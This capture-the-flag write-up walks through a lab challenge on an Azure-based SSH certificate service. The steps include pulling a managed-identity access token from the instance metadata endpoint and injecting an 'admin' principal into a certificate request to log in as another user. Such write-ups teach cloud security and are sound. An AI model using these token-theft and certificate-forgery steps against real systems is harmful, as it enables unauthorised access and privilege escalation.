# OBJECTIVE 17 - SSHennanigans  


## OBJECTIVE  
Help Alabaster Snowball secure his Azure-based SSH certificate system by exploring how it works and uncovering what kind of cookie cache he's planning to implement.

## Hints

Hints provided for Objective 17  
- If you’re on an Azure VM and the CLI isn’t available, try using the [Azure REST API](https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token).  
- Learn more about the [`get-source-control`](https://learn.microsoft.com/en-us/rest/api/appservice/web-apps/get-source-control?view=rest-appservice-2022-03-01) API endpoint to investigate how Azure Function Apps are deployed.  
- Check out [Thomas Bouve’s video](https://www.youtube.com/watch?v=4S0Rniyidt4) to understand SSH certificates.

---

## My Approach

This challenge combined cloud security, SSH certificates, and API exploration — a really fun deep dive!

### Step 1: Generate SSH Certificate  
Alabaster pointed us to the cert generator at:

```
https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl
```

Following [Thomas Bouve’s guide](https://www.youtube.com/watch?v=4S0Rniyidt4), I generated a key pair:

```bash
ssh-keygen -C "SSH Certificate CA" -f ca
```

I then copied the contents of `ca.pub` into the form on the certificate generator page. It returned a signed SSH certificate, which I saved to `SSHCert.pub`.

After trimming off the `principal` key at the end and setting permissions:

```bash
chmod 600 SSHCert.pub
```

I was able to connect using:

```bash
ssh -i ca -i SSHCert.pub monitor@ssh-server-vm.santaworkshopgeeseislands.org
```

Once connected, I was dropped into the **SatTrackr** dashboard. Hitting `Ctrl+C` brought me to the terminal.

---

### Step 2: Understand How Principal Mapping Works  
While exploring the server, I discovered the SSH cert mapping config:

```bash
/etc/ssh/sshd_config.d/sshd_config_certs.conf
```

This pointed to:

```
AuthorizedPrincipalsFile /etc/ssh/auth_principals/%u
```

So I looked inside that folder:

```bash
cat /etc/ssh/auth_principals/alabaster
# admin
cat /etc/ssh/auth_principals/monitor
# elf
```

This showed that:
- `monitor` → `elf`
- `alabaster` → `admin`

Unfortunately, I didn’t have permission to edit the `monitor` principal file, so I needed another way in.

---

### Step 3: Use Azure Instance Metadata to Explore the App  
Following the hint, I queried Azure’s instance metadata:

```bash
curl -s -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq
```

This gave me:
- **Subscription ID:** `2b0942f3-9bca-484b-a508-abdae2db5e64`  
- **Resource Group:** `northpole-rg1`

Next, I retrieved an access token for Azure’s management API:

```bash
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s | jq
```

I saved the token to a variable for easier use:

```bash
TOKEN=eyJ0e... (truncated)
```

Now I used Azure’s `get-source-control` REST endpoint:

```bash
curl https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web?api-version=2022-03-01 -H "Authorization:Bearer $TOKEN" | jq
```

The result showed the app was deployed from this GitHub repo:  
**`https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa`**

---

### Step 4: Modify the Certificate Request (ZAP Proxy)  
By reviewing the app’s source code, I found that the API defaults to a `DEFAULT_PRINCIPAL` unless you explicitly pass a `"principal"` in the POST request.

To exploit this, I used **OWASP ZAP** to intercept the POST request when submitting my public key to the certificate generator.

Before forwarding the request, I added:

```json
"principal": "admin"
```

The API responded with a cert that now had `admin` as the principal.

---

### Step 5: Reconnect as Alabaster  
I saved this new cert as `SSHCert_admin.pub` and set permissions:

```bash
chmod 600 SSHCert_admin.pub
```

Then connected using:

```bash
ssh -i ca -i SSHCert_admin.pub alabaster@ssh-server-vm.santaworkshopgeeseislands.org
```

Now I had access to the **alabaster** user account.

In his home directory, I found a file called `alabaster_todo.md`. Reading it revealed the answer:

```
- [ ] Gingerbread Cookie Cache: Implement a gingerbread cookie caching mechanism to speed up data retrieval times.
```

---

## Result

I successfully abused a misconfigured Azure Function App to issue myself an SSH cert with elevated privileges. This allowed me to log in as Alabaster and uncover that he plans to implement a:

**Gingerbread Cookie Cache**

---

## Lessons Learned

This was an excellent real-world example of how multiple small misconfigurations — unsigned certs, exposed metadata endpoints, and poorly secured web APIs — can be chained together for privilege escalation. It also showed how cloud metadata and REST APIs can be leveraged when standard tools like the Azure CLI are missing.
